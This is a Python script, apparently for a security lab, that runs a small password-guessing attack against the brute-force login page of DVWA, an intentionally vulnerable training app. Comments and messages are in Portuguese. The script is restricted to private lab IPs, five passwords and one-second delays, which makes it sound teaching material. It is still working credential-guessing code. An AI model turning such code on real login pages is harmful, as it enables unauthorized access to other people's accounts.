#!/usr/bin/env python3
"""Demonstração local do DVWA Low: no máximo 5 palpites e somente IP privado do laboratório."""
import argparse
import ipaddress
import os
import sys
import time

import requests


def main():
    parser = argparse.ArgumentParser(description="Tentativas restritas em DVWA Low de laboratório")
    parser.add_argument("--target", default="192.168.56.20", help="IP da VM DVWA, rede 192.168.56.0/24")
    parser.add_argument("--user", default="admin", help="Usuário de teste DVWA")
    parser.add_argument("--wordlist", default="wordlists/web-demo.txt")
    args = parser.parse_args()

    try:
        ip = ipaddress.ip_address(args.target)
    except ValueError:
        parser.error("Use IP numérico da VM, não nome DNS")
    if ip not in ipaddress.ip_network("192.168.56.0/24") and not ip.is_loopback:
        parser.error("Destino fora da rede permitida de laboratório")

    session_id = os.environ.get("DVWA_SESSION", "")
    if not session_id:
        parser.error("Configure DVWA_SESSION com PHPSESSID da sessão local")
    with open(args.wordlist, encoding="utf-8") as handle:
        passwords = [line.strip() for line in handle if line.strip() and not line.startswith("#")]
    if not 1 <= len(passwords) <= 5:
        parser.error("Wordlist deve conter entre 1 e 5 senhas")

    url = f"http://{ip}/dvwa/vulnerabilities/brute/"
    client = requests.Session()
    client.trust_env = False  # Não use proxies do sistema neste lab isolado
    client.cookies.set("PHPSESSID", session_id, path="/")
    client.cookies.set("security", "low", path="/")
    print(f"DVWA Low em {ip}: até {len(passwords)} tentativas, 1 segundo entre elas")

    for attempt, password in enumerate(passwords, 1):
        try:
            response = client.get(
                url,
                params={"username": args.user, "password": password, "Login": "Login"},
                timeout=5,
                allow_redirects=False,
            )
        except requests.RequestException as exc:
            print(f"[{attempt}] Falha de conexão: {exc}", file=sys.stderr)
            return 1
        body = response.text.lower()
        if response.status_code == 200 and "welcome to the password protected area" in body:
            print(f"[{attempt}] Indicador de sucesso detectado na resposta (confirme manualmente).")
            return 0
        if response.status_code in (301, 302, 303, 307, 308):
            print(f"[{attempt}] Redirecionamento HTTP {response.status_code}; revise login/sessão.")
            return 2
        if "username and/or password incorrect" in body:
            print(f"[{attempt}] Credencial rejeitada")
        else:
            print(f"[{attempt}] Resposta inconclusiva ({response.status_code}); confira nível Low e página")
            return 2
        if attempt < len(passwords):
            time.sleep(1)
    print("Nenhum indicador de sucesso; revise o relatório, sem inferir bloqueio automaticamente")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
